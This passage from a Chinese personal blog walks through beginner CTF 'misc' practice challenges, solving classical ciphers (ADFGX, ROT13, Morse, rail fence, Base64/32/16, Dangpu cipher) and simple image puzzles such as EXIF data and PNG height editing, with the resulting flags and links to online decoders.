md5_hash)</span><br></pre></td></tr></tbody></table></figure><p>这段代码会计算字符串<code>'Hello, World!'</code>的MD5哈希值，并打印出该哈希值。</p><p><code>hexdigest()</code>是<code>hashlib</code>库中<code>hash</code>对象的一个方法，用于获取以十六进制表示的哈希值。在计算完哈希值之后，可以使用<code>hexdigest()</code>方法将哈希值转换为字符串形式，方便输出或者存储。这样可以避免直接输出二进制形式的哈希值，使得结果更易读和使用。</p><h2 id="（4）杂项4：一个加密的xlsx表格"><a href="#（4）杂项4：一个加密的xlsx表格" class="headerlink" title="（4）杂项4：一个加密的xlsx表格"></a>（4）杂项4：一个加密的xlsx表格</h2><p><img src="https://pic.imgdb.cn/item/665734d3d9c307b7e96603a0.png"></p><blockquote><p>打开传送门后，想要下载表格就需要密码</p></blockquote><p><img src="https://pic.imgdb.cn/item/66573901d9c307b7e96c4d91.png"></p><blockquote><p>尝试用文本文档（txt）打开寻找线索，真就发现了线索</p></blockquote><p><img src="https://pic.imgdb.cn/item/665739a2d9c307b7e96d1572.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{asd}</span><br></pre></td></tr></tbody></table></figure><h2 id="（5）杂项5：刚刚截获德军的密电"><a href="#（5）杂项5：刚刚截获德军的密电" class="headerlink" title="（5）杂项5：刚刚截获德军的密电"></a>（5）杂项5：刚刚截获德军的密电</h2><p><img src="https://pic.imgdb.cn/item/66573d4ad9c307b7e9716e07.png"></p><p>==ADFGX古典密码==<br>　　1918年，第一次世界大战将要结束时，法军截获了一份德军电报，电文中的所有单词都由A、D、F、G、X五个字母拼成，因此被称为ADFGX密码。ADFGX密码是1918年3月由德军上校Fritz Nebel发明的，是结合了Polybius密码和置换密码的双重加密方案。<br>　　A、D、F、G、X即Polybius方阵中的前5个字母。 </p><p>　　明文：A T T A C K A T O N C E<br>　　经过Polybius变换：AF AD AD AF GF DX AF AD DF FX GF XF </p><blockquote><p>按照表进行转换：<img src="https://pic.imgdb.cn/item/665ddc6e5e6d1bfa054bb957.png" style="zoom:50%;"></p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：FA XX DD AG DD XA FF FF AX DX</span><br></pre></td></tr></tbody></table></figure><blockquote><p>第一个字母为行数，第二个字母为列数，转换后</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：flagabxxmo</span><br></pre></td></tr></tbody></table></figure><h2 id="（6）杂项6：简单加密"><a href="#（6）杂项6：简单加密" class="headerlink" title="（6）杂项6：简单加密"></a>（6）杂项6：简单加密</h2><p><img src="https://pic.imgdb.cn/item/665dde1e5e6d1bfa054dcabc.png"></p><blockquote><p>synt一看联想到凯撒密码，f与s偏移13位，直接上工具（<a href="https://www.lddgo.net/encrypt/caesar-cipher">在线凯撒密码加密解密 (lddgo.net)</a>）</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：synt{mxnd_pgs_xxxebg13}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/665ddf485e6d1bfa054f841c.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：flag{zkaq_ctf_kkkrot13}</span><br></pre></td></tr></tbody></table></figure><h2 id="（7）杂项7：社会主义核心价值观"><a href="#（7）杂项7：社会主义核心价值观" class="headerlink" title="（7）杂项7：社会主义核心价值观"></a>（7）杂项7：社会主义核心价值观</h2><p><img src="https://pic.imgdb.cn/item/665de01e5e6d1bfa0550f8e8.png"></p><blockquote><p>核心价值观加解密平台：（<a href="http://www.hiencode.com/cvencode.html">CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (hiencode.com)</a>）</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：公正公正公正诚信文明公正民主公正法治法治诚信民主法治诚信富强公正友善平等公正民主法治民主平等友善敬业法治和谐公正爱国法治诚信富强法治敬业公正爱国平等友善敬业和谐公正和谐富强和谐公正法治诚信和谐</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/665de7605e6d1bfa0559e813.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：flag{zkaq_shzyh_606}</span><br></pre></td></tr></tbody></table></figure><h2 id="（8）杂项8：奇怪的短信"><a href="#（8）杂项8：奇怪的短信" class="headerlink" title="（8）杂项8：奇怪的短信"></a>（8）杂项8：奇怪的短信</h2><p><img src="https://pic.imgdb.cn/item/665de7c25e6d1bfa055a4a31.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：33 53 21 41 94 52 21 72 74 42</span><br></pre></td></tr></tbody></table></figure><blockquote><p>手机上发短信有9键和26键，肯定不是和26键有关，考虑9键，</p></blockquote><p>看一个9键键盘：</p><img src="https://pic.imgdb.cn/item/665de8a65e6d1bfa055c4ced.jpg" style="zoom: 33%;"><blockquote><p>第一个字母首先考虑f，则看出33，就是“3”的第三个字母，推出密文:</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：flagzkaqsh</span><br></pre></td></tr></tbody></table></figure><h2 id="（9）杂项9：SOS的求救信息"><a href="#（9）杂项9：SOS的求救信息" class="headerlink" title="（9）杂项9：SOS的求救信息"></a>（9）杂项9：SOS的求救信息</h2><p><img src="https://pic.imgdb.cn/item/665de9b85e6d1bfa055e0252.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">密文：</span><br><span class="line">..-.</span><br><span class="line">....</span><br><span class="line">..-.</span><br><span class="line">.-..</span><br><span class="line">--.-</span><br><span class="line">.-</span><br><span class="line">.-</span><br><span class="line">--.</span><br><span class="line">-.-.</span><br><span class="line">--..</span><br><span class="line">--.</span><br><span class="line">-.-</span><br><span class="line">.-</span><br><span class="line">--..</span><br><span class="line">.-..</span><br></pre></td></tr></tbody></table></figure><blockquote><p>一眼得摩斯电码，查表解决</p></blockquote><p><img src="https://pic.imgdb.cn/item/665dea305e6d1bfa055e84cf.png" alt="摩斯电码表"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解密得：fhflqaagczgkazl</span><br></pre></td></tr></tbody></table></figure><blockquote><p>这个密码具备f、l、a、g，只是顺序有问题，考虑栅栏加密</p></blockquote><p>==栅栏加密：==</p><p>​        所谓的栅栏密码，就是将一段被加密的明文划分成N个组，然后取每个组的第1个字符，根据情况排列成一段话，特点相对简单，字母不会太多。</p><p>1、加密原理：</p><p>例如明文：THIS IS ZHISHITOM<br>去掉空格吧还是：THISISZHISHITOM<br>设置栏数为3加密：TSHHZIIHTSIOISM<br>下面分解一下加密过程（分为3组）:<br>第一组：T H I S I<br>第二组：S Z H I S<br>第三组：H I T O M<br>然后按列取出字母：TSH HZI IHT SIO ISM<br>然后连在一起就形成了加密：TSHHZIIHTSIOISM</p><p>2、解密原理<br>明确了加密的过程，下面逆推就行<br>加密明文：TSHHZIIHTSIOISM<br>先划分：<br>T S H<br>H Z I<br>I H T<br>S I O<br>I S M<br>按列顺序取字母：THISISZHISHITOM<br>完成了解密。<br>原文链接：<a href="https://blog.csdn.net/Makboli/article/details/126464442">https://blog.csdn.net/Makboli/article/details/126464442</a></p><p>栅栏加解密平台：（<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a>）</p><p><img src="https://pic.imgdb.cn/item/665df04d5e6d1bfa0564e571.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解出的明文：flagzkzhqacgalf</span><br></pre></td></tr></tbody></table></figure><blockquote><p>但是仍未通过，查看解析发现flag是需要将他倒置才可以</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交flag：flagcaqhzkzgalf</span><br></pre></td></tr></tbody></table></figure><h2 id="（10）杂项10：Base"><a href="#（10）杂项10：Base" class="headerlink" title="（10）杂项10：Base"></a>（10）杂项10：Base</h2><p><img src="https://pic.imgdb.cn/item/665df2705e6d1bfa0566e1ce.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：RzVBVE1RUlhJRTNER05aVUdZM0RPUVJXR0kzRENOWlRHWTJUR05SVEdRMlVNTlJTR1lZVE9NWldHVVpUQ01aV0c1Q0E9PT09</span><br></pre></td></tr></tbody></table></figure><p>Base加解密平台：<a href="http://www.hiencode.com/base64.html">CTF在线工具-在线base编码|在线base解码|base16编码|base32编码|base64编码 (hiencode.com)</a></p><ul><li>Base64，包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+/；</li><li>Base32，只有大写字母（A-Z）和数字234567；</li><li>Base16，只有16进制的数据，其范围是数字(0-9)，字母（ABCDEF）。</li></ul><blockquote><p>该密文有小写所以为Base64</p></blockquote><p><img src="https://pic.imgdb.cn/item/665df4e75e6d1bfa05691bbd.png" alt="Base64解密"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Base64解密后：G5ATMQRXIE3DGNZUGY3DOQRWGI3DCNZTGY2TGNRTGQ2UMNRSGYYTOMZWGUZTCMZWG5CA====</span><br></pre></td></tr></tbody></table></figure><blockquote><p>解密后只有大写和数字234567，判断为Base32，继续解密</p></blockquote><p><img src="https://pic.imgdb.cn/item/665df54b5e6d1bfa056980e9.png" alt="Base32解密"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Base32解密后：7A6B7A6374667B6261736536345F6261736531367D</span><br></pre></td></tr></tbody></table></figure><blockquote><p>此时只有16进制的数据，其范围是数字(0-9)和字母</p></blockquote><p><img src="https://pic.imgdb.cn/item/665df5fb5e6d1bfa056a19a8.png" alt="Base16解密"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到flag：zkzctf{base64_base16}</span><br></pre></td></tr></tbody></table></figure><h2 id="（11）杂项11：这是我最喜欢的女明星"><a href="#（11）杂项11：这是我最喜欢的女明星" class="headerlink" title="（11）杂项11：这是我最喜欢的女明星"></a>（11）杂项11：这是我最喜欢的女明星</h2><p><img src="https://pic.imgdb.cn/item/665df6645e6d1bfa056a6e0d.png"></p><blockquote><p>第一反应是像之前一样下载下来用txt打开找flag，但是发现有太多信息了，找不到，于是回去看了解析，居然是用试图软件去识别图片人物啊！</p><p>百度识图：<a href="https://graph.baidu.com/pcpage/index?tpl_from=pc">https://graph.baidu.com/pcpage/index?tpl_from=pc</a></p></blockquote><p><img src="https://pic.imgdb.cn/item/665df7ac5e6d1bfa056cf802.png"></p><blockquote><p>那这个女神就是邱淑贞了，那就去查一查她的英文名吧！</p><p>flag：Chingmy Yau</p></blockquote><h2 id="（12）杂项12：打由诗"><a href="#（12）杂项12：打由诗" class="headerlink" title="（12）杂项12：打由诗"></a>（12）杂项12：打由诗</h2><p><img src="https://pic.imgdb.cn/item/665df82f5e6d1bfa056d600b.png"></p><blockquote><p>在网上查找得知此为当铺密码，将其每个字都转换为数字</p></blockquote><p>==当铺密码==：</p><p>当前汉字有多少笔画出头，就是转化成数字几。例如：</p><p>王：该字外面有 6 个出头的位置，所以该汉字对应的数字就是 6；</p><p>口：该字外面没有出头的位置，那就是0；</p><p>人：该字外面有 3 个出头的位置，所以该汉字对应的数字就是 3；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：由口中,由口井,圭土,由口人,由中人,由中中,由口主,由中中,圭土,由凹凸,由由中,由目圭,克工</span><br></pre></td></tr></tbody></table></figure><blockquote><p>将其转换为数字，并用ASCII码解开</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：102 108 97 103 123 122 107 122 95 100 112 109 109 54</span><br><span class="line">flag{zkz_dpm6}</span><br></pre></td></tr></tbody></table></figure><h2 id="（13）杂项13：佛说"><a href="#（13）杂项13：佛说" class="headerlink" title="（13）杂项13：佛说"></a>（13）杂项13：佛说</h2><p><img src="https://pic.imgdb.cn/item/66681165d9c307b7e9d315a4.png"></p><blockquote><p>网上查看其为与佛论禅，那就寻找工具解密</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：佛曰：諳娑蒙罰世那真耶除梵沙缽能蒙切一怯南缽爍皤若佛涅無侄殿依缽以俱耨皤大缽若道他怯數等侄即喝至能楞怯伊奢阿諳利哆跋遮知智罰悉缽伽即所遠那等多</span><br></pre></td></tr></tbody></table></figure><blockquote><p>解密工具：<a href="https://ctf.bugku.com/tool/todousharp">与佛论禅密码 - Bugku CTF</a></p></blockquote><p><img src="https://pic.imgdb.cn/item/6668112dd9c307b7e9d27154.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{zkaq_fochan}</span><br></pre></td></tr></tbody></table></figure><h2 id="（14）杂项14-奇怪的Base加密"><a href="#（14）杂项14-奇怪的Base加密" class="headerlink" title="（14）杂项14:奇怪的Base加密"></a>（14）杂项14:奇怪的Base加密</h2><p><img src="https://pic.imgdb.cn/item/666811c2d9c307b7e9d3e30f.png"></p><blockquote><p>下载文件，这么长的一段Base,还有;base64,这个关键词，这个一定是图片Base64加密，直接解密就可以了</p><p>加解密平台：<a href="https://tool.chinaz.com/tools/imgtobase/">https://tool.chinaz.com/tools/imgtobase/</a></p><p>记得加一个头部图片的格式：data:image/jpg；</p></blockquote><p><img src="https://pic.imgdb.cn/item/6668137bd9c307b7e9d86cea.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{base64_tupian_a}</span><br></pre></td></tr></tbody></table></figure><h2 id="（15）杂项15：跳舞小人"><a href="#（15）杂项15：跳舞小人" class="headerlink" title="（15）杂项15：跳舞小人"></a>（15）杂项15：跳舞小人</h2><p><img src="https://pic.imgdb.cn/item/666813f5d9c307b7e9d9652a.png"></p><blockquote><p>跳舞小人中明显有一个二维码，截图发现少了一块，补上直接扫描</p></blockquote><p>得到flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{GC-ACUID}</span><br></pre></td></tr></tbody></table></figure><h2 id="（16）杂项16：神秘图片"><a href="#（16）杂项16：神秘图片" class="headerlink" title="（16）杂项16：神秘图片"></a>（16）杂项16：神秘图片</h2><p><img src="https://pic.imgdb.cn/item/666815bbd9c307b7e9dbb43c.png"></p><blockquote><p>下载文件，然后右键属性，看到里面的照相机镜头信息</p></blockquote><img src="https://pic.imgdb.cn/item/66681627d9c307b7e9dc292f.png" style="zoom:67%;"><p>得到flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{ctf_tupian_666}</span><br></pre></td></tr></tbody></table></figure><h2 id="（17）杂项17-可达鸭"><a href="#（17）杂项17-可达鸭" class="headerlink" title="（17）杂项17:可达鸭"></a>（17）杂项17:可达鸭</h2><p><img src="https://pic.imgdb.cn/item/6668171bd9c307b7e9dd3a34.png"></p><blockquote><p>看到图片明显能感觉到显示不全，下载发现是一个png图片</p></blockquote><p><img src="https://pic.imgdb.cn/item/66681fbcd9c307b7e9e57207.png"></p><blockquote><p>自然就想到利用16进制编辑器打开图片，到找IHDR调整大小，发现后面的flag，可以使用网上的16进制编辑器，把图片长度更改；工具：<a href="https://hexed.it/">HexEd.it — 基于浏览器的十六进制编辑器</a></p></blockquote><p><img src="https://pic.imgdb.cn/item/66682061d9c307b7e9e74795.png"></p><p>更改为：</p><p><img src="https://pic.imgdb.cn/item/66682085d9c307b7e9e7996d.png"></p><p>得到图片：</p><img src="https://pic.imgdb.cn/item/666820bad9c307b7e9e7d4ea.png" style="zoom:50%;"><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{ke-da-ya!}</span><br></pre></td></tr></tbody></table></figure><h2 id="（18）杂项18：一组神秘的图片"><a href="#（18）杂项18：一组神秘的图片" class="headerlink" title="（18）杂项18：一组神秘的图片"></a>（18）杂项18：一组神秘的图片</h2><p><img src="https://pic.imgdb.cn/item/66682115d9c307b7e9e85cc0.png"></p><blockquote><p>下载压缩包，解压之后得到一些黑白图，这个图片只有黑和白两种，有点像二进制中的0和1，尝试把白色换成0，黑色换成1，得出一串二进制</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">二进制：01100110011011000110000101100111011110110110011100101101011000110110011101111101</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66682247d9c307b7e9ea346c.png"></p><blockquote><p>将其转换为ASCII码，工具：<a href="https://coding.tools/cn/binary-to-text">2进制到ASCII字符串在线转换工具 - Coding.Tools</a></p></blockquote><p><img src="https://pic.imgdb.cn/item/666822f5d9c307b7e9eae9a2.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{g-cg}</span><br></pre></td></tr></tbody></table></figure><h2 id="（19）杂项19：神奇的压缩包加密"><a href="#（19）杂项19：神奇的压缩包加密" class="headerlink" title="（19）杂项19：神奇的压缩包加密"></a>（19）杂项19：神奇的压缩包加密</h2><p><img src="https://pic.imgdb.cn/item/66682384d9c307b7e9eb7a3d.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开创博客</title>
      <link href="/2024/05/20/kai-chuang-bo-ke/"/>
      <url>/2024/05/20/kai-chuang-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="欢迎来到-xmhhmxblog！"><a href="#欢迎来到-xmhhmxblog！" class="headerlink" title="欢迎来到 xmhhmxblog！"></a>欢迎来到 xmhhmxblog！</h1>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
